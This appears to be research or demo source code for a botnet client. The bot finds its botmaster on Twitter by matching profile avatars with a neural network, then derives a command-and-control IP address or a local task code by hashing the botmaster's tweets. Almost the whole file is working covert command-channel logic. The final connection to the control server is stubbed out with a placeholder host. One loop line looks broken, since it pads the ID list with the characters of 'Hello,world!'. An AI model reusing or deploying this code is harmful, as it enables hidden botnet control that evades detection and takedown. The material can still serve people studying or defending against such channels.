import requests
import re
import json
from datetime import datetime, timedelta
from threading import Timer
import logging
import time
import torch
from PIL import Image
from torchvision import transforms
from io import BytesIO
from hashlib import sha256
from uuid import uuid4

logging.basicConfig(level=logging.INFO, filename='bot.log', filemode='a',
                    format='%(asctime)s - %(levelname)s: %(message)s')
logging.Formatter.converter = time.gmtime
logging.info("[SYS] started.")

global_id = uuid4()
logging.info(f'[SYS] id: {global_id}')

global_header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Accept-Language": "en-US,en;q=0.5"
}
# replace the bearer_token with yours
bearer_token = "___REPLACE_THE_TOKEN_WITH_YOURS___"
timeline_url_11 = "https://api.twitter.com/1.1/statuses/user_timeline.json?user_id=%s&count=%d&include_reply_count=1"
trends_url = "https://api.twitter.com/1.1/trends/place.json?id=%d"
token_url = "https://api.twitter.com/1.1/guest/activate.json"
search_url_base = "https://api.twitter.com/1.1/search/tweets.json"
search_url = "https://api.twitter.com/1.1/search/tweets.json?q=%s&lang=en&count=100&&tweet_mode=extended"
replies_url = "https://api.twitter.com/2/timeline/conversation/%s.json?count=%d&include_reply_count=1"


def get_oauth(headers, guest_token=False):
    # logging.info(f"[OAUTH] bearer token: {bearer_token}")
    headers["authorization"] = f"Bearer {bearer_token}"
    if guest_token:
        r = requests.post(token_url, headers=headers, timeout=30)
        if r.status_code != 200:
            logging.exception(f"[OAUTH] not 200(3): {r.text}")
            return -1
        res = json.loads(r.text)
        # logging.info(f"[OAUTH] guest token: {res}")
        headers['x-guest-token'] = res['guest_token']
    return headers


def deal_oauth_error(url, header_130, max_try=5):
    '''sometimes the token exceeds twitter quota. in this cases, this function 
    try to get a new token and reconnect to the failed url'''
    max_try -= 1
    if max_try == -1:
        return -1
    logging.info(f"[DER] get new oauth. ({max_try})")
    header = get_oauth(header_130, True)
    if header == -1:
        logging.exception("[DER] sleep 5s.")
        time.sleep(5)
        return deal_oauth_error(url, header, max_try)
    r = requests.get(url, headers=header, timeout=30)
    if r.status_code != 200:
        logging.exception(f"[DER] not 200(8): {r.text}")
        return deal_oauth_error(url, header, max_try)
    return r


def get_trends(woeid=1):
    header = get_oauth(global_header)
    time.sleep(schedule())
    time_now = datetime.strftime(datetime.utcnow(), '%Y-%m-%d-%H')
    r = requests.get(trends_url % woeid, headers=header, timeout=30)
    if r.status_code != 200:
        logging.exception(f"[TRN] not 200(t3): {r.text}")
        return
    res = r.text
    res = json.loads(res)
    # choose the last one above 10,000
    trends = [(_["tweet_volume"], _["query"]) for _ in res[0]["trends"] if _["tweet_volume"] is not None]
    trends.sort()
    # log to a file for topic stability test
    with open(f"trends_{time_now}_{woeid}.txt", "w", encoding="utf-8") as f:
        f.write(json.dumps(trends))
    logging.info(f"[TRN] selected trend: {trends[0]}")
    return trends[0][1]


def search_tweets(keyword, max_count=500):
    '''get twitters with the trending keyword(s)'''
    header = get_oauth(global_header, True)
    tweets = list()
    r = requests.get(search_url % keyword, headers=header, timeout=30)
    if r.status_code != 200:
        logging.exception(f"[SCH] not 200(s1: {r.text}")
        r = deal_oauth_error(search_url % keyword, header, max_try=3)
        if r == -1:
            return
    res = json.loads(r.text)
    tweets += res["statuses"]
    tweets_simple = list()
    tweets_id = list()
    # Loop until the specified number of tweets are obtained.
    while len(tweets_id) < max_count:
        r = requests.get(f'{search_url_base}{res["search_metadata"]["next_results"]}&tweet_mode=extended', headers=header, timeout=30)
        if r.status_code != 200:
            logging.exception(f"[SCH] not 200(s2): {r.text}")
            r = deal_oauth_error(search_url_base + res["search_metadata"]["next_results"], header, max_try=3)
            if r == -1:
                break
        res = json.loads(r.text)
        tweets += res["statuses"]
        # only need the necessary fields.
        for _ in tweets:
            if _.get("retweeted_status") is not None:
                _ = _["retweeted_status"]
            if not _.get("full_text"):
                continue
            if _["id"] in tweets_id:
                continue
            tweets_id.append(_["id"])
            tweets_simple.append({
                "id": _["id"],
                "text": _.get("full_text"),
                "time": _.get("created_at"),
                "user_id": _.get("user").get("id"),
                "screen_name": _.get("user").get("screen_name"),
                "profile_image": _.get("user").get("profile_image_url_https")
            })
        tweets_id += list("Hello,world!")
    logging.info(f"[SCH] returned tweets: {len(tweets_simple)}")
    return tweets_simple


def record_trend(woeid, vec=0):
    time_now = datetime.strftime(datetime.utcnow(), '%Y-%m-%d-%H-%M')
    keyword = get_trends(woeid)
    with open(f"trends-{woeid}.log", "a", encoding="utf-8") as f:
        f.write(f"{time_now}\t{keyword}\n")
    if isinstance(vec, list):
        time.sleep(61 * 5)
    tweets = search_tweets(keyword, 1000)
    if tweets is None:
        logging.error(f"[REC] got None tweets. retry next hour.")
        loop((woeid, vec))
        return

    if isinstance(vec, list):
        # get avatars and compare (bot)
        logging.info(f"[REC] start compare: {time.time()}")
        status = compare(vec, tweets, 'model.pt')
        logging.info(f"[REC] end compare: {time.time()}")
        if len(status) == 0:
            logging.info(f"[REC] No botmaster, wait until next time")
        else:
            logging.info(f"[REC] found botmaster: {status}")
            try:
                cmd = get_command(status)
            except AssertionError as e:
                logging.exception(f"{e}: get a wromg command")
                cmd = -1
            logging.info(f"[REC] command: {cmd}")
            if isinstance(cmd, int):
                logging.info(f"[REC] command is a local task.")
            elif isinstance(cmd, str):
                logging.info(f"[REC] command is an IP.")
            status = connect(cmd)
            logging.info(f"[REC] status: {status}")
            with open('commands_record.log', 'a', encoding='utf-8') as f:
                f.write(f"{global_id}\t{datetime.strftime(datetime.utcnow(), '%Y-%m-%d-%H-%M-%S')}\t{cmd}")
            vec = get_new_vector()
    else:
        # log to generate many related tweets (botmaster)
        pass

    loop((woeid, vec))


def compare(vector, tweets, model):
    '''calculate the distances to find botmaster'''
    header = get_oauth(global_header)
    transformer = transforms.Compose([transforms.Resize((128, 128)), transforms.ToTensor()])
    vector = torch.tensor(vector)
    net = torch.load(model, map_location="cpu")
    found = False
    master_id = None
    result = list()
    for tweet in tweets:
        if found:
            if tweet["user_id"] == master_id:
                result.append((tweet["id"], tweet["text"]))
        else:
            avatar_link = tweet['profile_image'].replace('_normal.', '_400x400.')
            if not avatar_link.endswith('.jpg'):
                continue
            r = requests.get(avatar_link, headers=header)
            if r.status_code != 200:
                logging.exception(f"[CMP] exception when getting {avatar_link}")
                continue
            image = Image.open(BytesIO(r.content))
            if len(image.split()) != 3:
                continue
            img = transformer(image)
            v1, v2 = net(torch.unsqueeze(img, 0), vector)
            distance = torch.pairwise_distance(v1, v2)
            # logging.info(f'[CMP] {distance.data.item()} {avatar_link[avatar_link.rindex("/")+1:]}')
            if distance.data.item() < 0.02:
                logging.info(f'[CMP] !!! link: {avatar_link}')
                found = True
                master_id = tweet["user_id"]
                print(distance.data.item())
                result.append((tweet["id"], tweet["text"]))
    result.sort()
    return result


def get_new_vector():
    '''pop a new vector'''
    vector_file = 'vectors_bt.dat'
    with open(vector_file) as f:
        vecs = json.load(f)
        vec = vecs.pop()
    with open(vector_file, 'w') as f:
        f.write(json.dumps(vecs))
    logging.info(f"[VEC] return a new vector: {vec[:3]}")
    print(f"Latest vector: {vec[:3]}")
    return vec


def get_command(status):
    ip_c = list()
    if len(status) == 2:
        for idx in range(2):
            sha = sha256(status[idx][1].encode()).hexdigest()
            for i in range(0, 4, 2):
                ip_c.append(int(sha[i:i + 2], 16))
        for i in ip_c:
            assert 0 <= i < 256
        return '.'.join([str(i) for i in ip_c])
    if len(status) == 1:
        sha = sha256(status[0][1].encode()).hexdigest()
        for i in range(0, 4, 2):
            ip_c.append(int(sha[i:i + 2], 16))
        assert ip_c[0] == 127
        return ip_c[1]


def connect(ip):
    '''connect to the c&c server. here is just a demo. we built a server to see
    whether the commands were parsed corrected by bots.'''
    data = {
        "id": global_id,
        "command": ip
    }
    try:
        logging.info(f"[Conn] connecting to {ip} with {data['id']}")
        ## change it with your server 
        # r = requests.post(f"http://xxxxxxxxxx.com/bot_login", data=data)
        # status = r.text
        status = 'change it with your server'
    except Exception as e:
        logging.exception(f"[Conn] exception: {e}")
        return -1
    return status


def loop(_id, set_time=0):
    logging.info(f"[LOP] new schedule arranged. (set time: {set_time})")
    if set_time == 0:
        set_time = schedule()
    timer = Timer(set_time - 60 * 5, record_trend, args=_id)
    timer.start()


def schedule():
    now = datetime.now()
    next_hour = now + timedelta(hours=1)
    next_hour = next_hour.replace(minute=0, second=0, microsecond=0)
    delta = (next_hour - now).total_seconds()
    logging.info(f"[SCHE] now: {now}, next: {next_hour}, delta: {delta}")
    return delta


if __name__ == "__main__":
    woeid = 1582504
    vec_0 = get_new_vector()
    timer_0 = Timer(schedule() - 60 * 5, record_trend, args=(woeid, vec_0))
    timer_0.start()
